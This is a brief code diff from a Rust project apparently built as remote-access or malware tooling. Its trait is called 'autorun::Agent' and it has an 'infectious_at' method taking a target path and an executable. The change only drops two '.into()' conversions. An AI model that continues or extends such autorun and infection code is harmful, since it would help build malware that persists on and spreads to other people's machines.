@@ -51,7 +51,7 @@ impl m0n1t0r_common::autorun::Agent for AgentObj {
             )?);
             Ok::<_, anyhow::Error>(())
         });
-        Ok(rx.await?.into())
+        Ok(rx.await?)
     }
 
     async fn infectious_at(&self, target: PathBuf, exe: PathBuf) -> AppResult<bool> {
@@ -64,7 +64,7 @@ impl m0n1t0r_common::autorun::Agent for AgentObj {
             )?);
             Ok::<_, anyhow::Error>(())
         });
-        Ok(rx.await?.into())
+        Ok(rx.await?)
     }
 }
 
